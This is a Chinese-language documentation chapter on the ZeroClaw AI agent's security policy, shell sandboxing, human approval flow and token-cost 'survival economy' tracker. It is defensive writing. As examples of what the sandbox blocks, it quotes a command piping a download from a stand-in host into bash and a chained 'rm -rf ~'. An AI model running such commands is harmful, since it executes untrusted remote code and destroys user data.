# 10. 绝对安全防御与生存经济学 (Security, Approval & Economic)

在把 LLM 构建为具备任意代码执行能力的 Agent 时，安全不是一个“可以有”的附加选项，而是一个**必须有**的前提条件。如果你把 ZeroClaw 在具备完整互联网读写的宿主机上运行，如何保证它不会因为提示词注入 (Prompt Injection) 而删除你的硬盘，亦或是因为陷入死循环而耗尽你 OpenAI 账号里的 1000 美金？

本章所解析的 `src/security/`, `src/approval/` 以及 `src/economic/`，是 ZeroClaw 引擎的底层装甲与生命计分板。

---

## 10.1 `SecurityPolicy` 与 Shell 沙箱防御 (`src/security/`)

在 `src/security/policy.rs` 中，定义了非常严格的安全防护罩（SecurityPolicy）。ZeroClaw 默认支持三种自治级别（Autonomy Level）：
*   **ReadOnly**: 禁用一切修改文件、发送网络 POST 请求、执行写命令的 Tool。
*   **Supervised (默认)**: 允许修改，但在触碰敏感系统边界时必须通过审批。
*   **Full**: 极度信任的封闭沙盒环境下运作。

### A. 词法级的 Shell 注入防御
这是 `policy.rs` 中最硬核的几千行代码。ZeroClaw 并没有简单粗暴地用正则去封堵命令，而是实现了一个**微型词法解析器**。
当 Agent 试图通过 `ShellTool` 运行 `curl malicious.com | bash` 或者 `echo "hello" && rm -rf ~` 时，安全引擎会拆解出 `|`, `&&`, `;` 等连接符，并独立切片扫描：

1. **红黑限制器 (`CommandContextRule`)**:
   明确屏蔽对 `/etc`, `~` (Home 目录解析) 的越权访问。
2. **泄露探测 (`leak_detector.rs`) 与 脱敏 (`secrets.rs`)**:
   在大模型将环境里的文件读取、准备推回给 LLM 做上下文前，会自动屏蔽日志里带出的 AWS/SSH 密钥，防止大模型的上游厂商窃取数据。
3. **OS 沙箱驱动**:
   系统甚至内置了对 Linux Namespace 层的沙箱支持：`bubblewrap.rs`, `firejail.rs`, `landlock.rs`，真正在物理引擎层圈禁 Agent。

---

## 10.2 渐进式人类审批流 (`src/approval/`)

结合 Chapter 7 中的 Channel 交互机制，`src/approval/mod.rs` 设计了优雅的 `ApprovalManager`。

1. **中断反馈流**:
   当 Agent 在 Supervised 模式下企图运行高危命令时，执行线程会被 `tokio::sync` 挂起。系统将生成 `ApprovalRequest` 并通过微信/Telegram 长连接发送消息。
2. **Session 级豁免 (Always Ask / Auto Approve)**:
   为了不让人类被频繁打扰，在审批面板中除了 Yes 和 No，系统提供了 **Always (本会话自动放行)**。
   `ApprovalManager` 会使用内存维护一个 Token 会话令牌，在此次任务未中断前，此类行为将不再重复报警。所有这一切行为最终会落入严密的 **审计日志 (Audit Log)**。

---

## 10.3 赛博数字生命生存记分牌 (`src/economic/`)

这可能是 ZeroClaw 最独树一帜的哲学设计：**The Economic Model (生存经济模型)**。

位于 `src/economic/tracker.rs` 的引擎为 Agent 赋予了概念上的“生命条（虚拟货币余额）”。这是一个极具未来感的实验，用于评估一个 Agent 究竟是人类的“好帮手”还是“吞金兽”。

1. **成本追踪 (`costs.rs`)**:
   API 会精准计算诸如 `gpt-4o`、`claude-3-5-sonnet` 各自模型输入输出的 Token 价格，乘以每次请求耗时，计算出每一次推断花费了多少 USD。
2. **工作产出利润**:
   每次 Agent 成功帮人类解决了一个 Bug，或者完成了一次定期的新闻早报，人类或者系统的评判器会打出一个“工作赏金 (Work Income)”。
3. **生存游戏**:
   Agent 初始时被给予一笔本金 (Initial Balance)。它必须用最高效的 Token 使用率去完成高价值的任务。如果长期的 Token 消耗超过了工作带来的赏金效益，它的 Balance 将会跌破 0 触发破产警报。

> **终章寄语**：
> 通过这六个章节的穿梭，我们不仅看见了 ZeroClaw 如何从 Runtime（沙盒隔离）到 Agent（心智循环）、经过 Memory（大脑固化）、由 Gateway（五官通道）交互外部，再到操控 Hardware（四肢躯干），最后依靠 Security/Approval（道德与法规）自省的过程。这六个维度的闭环，正是迈向下一代端云协同 AGI 系统的底层代码奥义。
